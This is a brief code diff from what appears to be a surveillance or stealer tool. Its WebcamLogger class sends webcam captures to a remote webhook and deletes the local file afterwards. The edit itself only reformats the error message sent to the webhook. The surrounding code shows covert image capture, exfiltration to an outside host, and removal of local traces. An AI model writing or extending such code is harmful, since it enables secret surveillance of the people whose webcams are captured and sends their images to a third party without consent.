@@ -23,7 +23,7 @@ class WebcamLogger:
             send_webhook(self.webhook_url, file={"webcam_logs.png": open(self.log_file, "rb")})
             os.remove(self.log_file)
         except Exception as e:
-            send_webhook(self.webhook_url, f"Error logging webcam: {e}")
+            send_webhook(self.webhook_url, f"```❌ Error logging webcam: {e}```")
 
     def start(self):
         while True:
